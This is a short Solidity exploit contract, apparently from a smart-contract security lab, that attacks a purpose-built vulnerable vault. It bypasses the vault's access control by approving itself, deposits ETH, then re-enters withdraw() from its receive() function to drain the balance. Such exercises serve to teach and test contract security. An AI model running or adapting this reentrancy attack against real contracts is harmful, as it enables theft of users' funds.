// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ChainedExploitVault} from "../src/ChainedExploitVault.sol";

contract ChainedAttack {
    ChainedExploitVault public vault;
    uint256 public reentered;

    constructor(address _vault) {
        vault = ChainedExploitVault(_vault);
    }

    function pwn() external payable {
        // 1. Bypass access control — approve yourself
        vault.setApproved(address(this), true);
        // 2. Deposit 1 ETH to seed balance
        vault.deposit{value: msg.value}();
        // 3. Withdraw with reentrancy — drains entire vault
        vault.withdraw();
    }

    receive() external payable {
        // Reenter while vault still has ETH
        if (reentered < 10 && address(vault).balance > 0) {
            reentered++;
            vault.withdraw();
        }
    }
}